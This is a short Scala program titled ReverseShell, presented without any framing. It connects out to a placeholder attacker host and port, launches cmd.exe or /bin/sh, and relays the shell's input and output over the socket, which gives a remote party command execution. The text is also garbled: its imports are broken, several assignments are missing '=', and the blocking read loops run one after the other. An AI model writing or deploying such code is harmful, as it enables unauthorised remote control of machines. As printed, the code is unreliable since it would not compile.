import java.io.

import java.net..

object ReverseShell extends App {

val socket = new Socket("attacker_ip", attacker_port)

val shell if (System.getProperty("os.name").toLowerCase.contains("win")) "cmd.exe" else

"/bin/sh"

val process = new ProcessBuilder (shell)

.redirectErrorStream(true)

.start()

val processInput new BufferedReader(new InputStreamReader (process.getInputStream))

val socketOutput new PrintWriter(socket.getOutputStream, true)

val socketInput = new BufferedReader(new InputStreamReader(socket.getInputStream))

val processOutput process.getOutputStream

processInput.lines().forEach { line =>

socketOutput.println(line)

}

socketInput.lines().forEach { line =>

processOutput.write((line + "\n").getBytes)

processOutput.flush()

}

processInput.close()

socketInput.close()

socket.close()

}